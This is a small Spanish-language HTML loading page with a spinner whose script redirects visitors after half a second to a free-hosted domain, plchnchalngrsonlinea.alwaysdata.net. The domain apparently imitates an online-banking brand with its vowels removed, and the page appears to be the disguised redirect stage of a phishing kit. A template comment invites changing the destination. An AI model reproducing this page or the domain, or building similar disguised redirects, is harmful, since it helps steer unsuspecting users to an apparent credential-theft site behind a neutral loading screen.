<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Cargando...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f7f7f7;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: Arial, sans-serif;
    }

    .loader {
      text-align: center;
    }

    .spinner {
      border: 5px solid #eee;
      border-top: 5px solid #333;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 0.8s linear infinite;
      margin: 0 auto 15px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    p {
      color: #333;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="loader">
    <div class="spinner"></div>
    <p>Cargando, espera un momento...</p>
  </div>

  <script>
    // Cambia esta URL al destino final
    const destino = "https://plchnchalngrsonlinea.alwaysdata.net/";

    setTimeout(() => {
      window.location.href = destino;
    }, 500); // 0.5 segundos
  </script>
</body>
</html>
